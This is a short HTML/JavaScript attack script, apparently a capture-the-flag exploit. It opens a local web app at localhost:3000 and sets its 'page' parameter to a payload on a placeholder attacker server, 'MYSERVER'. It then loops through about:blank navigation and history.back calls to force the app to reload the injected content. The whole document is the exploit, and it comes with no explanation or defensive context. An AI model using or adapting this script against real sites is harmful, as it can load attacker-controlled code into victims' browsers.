<script>

function sleep(ms = 0) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let w = null;

async function main(){
    if(!w){
        w = window.open("http://localhost:3000")
        await sleep(100)
    }
    
    w.location="http://localhost:3000/?user=a&page=http://MYSERVER/payload"
    

    while(1){
        await sleep(100);
        w.location = "about:blank"
        await sleep(100)
        w.history.back(-2)
    }

}

</script>